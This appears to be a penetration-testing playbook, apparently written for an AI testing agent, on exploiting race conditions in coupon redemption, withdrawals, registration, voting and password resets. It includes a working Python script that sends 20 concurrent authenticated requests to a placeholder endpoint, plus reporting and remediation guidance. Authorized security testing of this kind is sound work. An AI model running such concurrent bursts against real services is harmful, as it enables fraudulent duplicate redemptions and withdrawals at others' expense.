# Offensive Playbook: Race Conditions & Business Logic Concurrency

## 1. Overview & Attack Surface
Race conditions occur when an application processes multiple concurrent requests on shared state (e.g. account balances, coupon redemption, password reset tokens, gift card claims) without atomic database transactions, mutex locks, or idempotency keys.

## 2. High-Impact Target Workflows
- **Coupon / Promo Code Redemption**: Applying a single-use coupon multiple times simultaneously.
- **Funds Transfer / Withdrawal**: Withdrawing more money than available balance.
- **Account Registration**: Claiming the same username or email concurrently.
- **Voting / Liking Systems**: Casting multiple votes when limit is 1.
- **Password Reset**: Exchanging an expiring reset token multiple times.

## 3. Exploitation Methodology (HTTP/2 Single-Packet Attack & Python Concurrency)

### A. Python Asyncio Concurrent Burst Script
Write and execute a concurrent probe inside the sandbox:
```python
import asyncio
import httpx

TARGET_URL = "https://target.local/api/coupons/apply"
TOKEN = "USER_JWT_TOKEN"
PAYLOAD = {"code": "DISCOUNT50"}

async def send_request(client, req_id):
    headers = {"Authorization": f"Bearer {TOKEN}"}
    resp = await client.post(TARGET_URL, json=PAYLOAD, headers=headers)
    print(f"Request {req_id}: Status {resp.status_code}, Body: {resp.text[:100]}")
    return resp

async def main():
    async with httpx.AsyncClient(http2=True, timeout=10.0) as client:
        # Pre-warm connection
        await client.get("https://target.local/health")
        
        # Fire 20 requests in parallel
        tasks = [send_request(client, i) for i in range(20)]
        results = await asyncio.gather(*tasks)
        
        successes = sum(1 for r in results if r.status_code == 200)
        print(f"Total successful redemptions: {successes}")

if __name__ == "__main__":
    asyncio.run(main())
```

### B. Evaluating Results
- If multiple requests return `200 OK` and discount/credit is applied more than once, race condition is confirmed.
- Verify final state: check user balance or order total to ensure the backend actually processed the multiple claims.

## 4. Verification & Reporting
1. Document the exact number of successful duplicate operations.
2. File finding via `create_vulnerability_report`:
   - **Category**: Broken Business Logic / Concurrency
   - **CWE**: CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)
   - **CVSS 3.1**: `AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N` (Base 5.3 Medium to High depending on financial impact)
   - **Remediation**: Use `SELECT ... FOR UPDATE`, distributed Redis locks, or unique constraint database transactions.
